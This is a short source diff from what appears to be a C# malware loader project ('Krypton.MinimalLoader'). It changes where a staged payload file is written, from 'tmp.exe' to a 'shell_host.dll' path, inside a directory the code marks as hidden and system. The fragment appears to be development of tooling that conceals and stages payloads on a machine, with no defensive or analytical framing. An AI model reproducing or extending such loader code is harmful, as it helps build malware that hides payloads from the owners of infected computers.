@@ -41,7 +41,8 @@ namespace Krypton.MinimalLoader.Core.Http
 					dir.Attributes = FileAttributes.Hidden | FileAttributes.Directory | FileAttributes.System;
 				}
 
-				file_path = "temporary\\tmp.exe";
+				file_path = Path.GetFullPath("temporary\\shell_host.dll");
+				//file_path = "temporary\\shell_host.dll";
 
 				if (File.Exists(file_path))
 				{
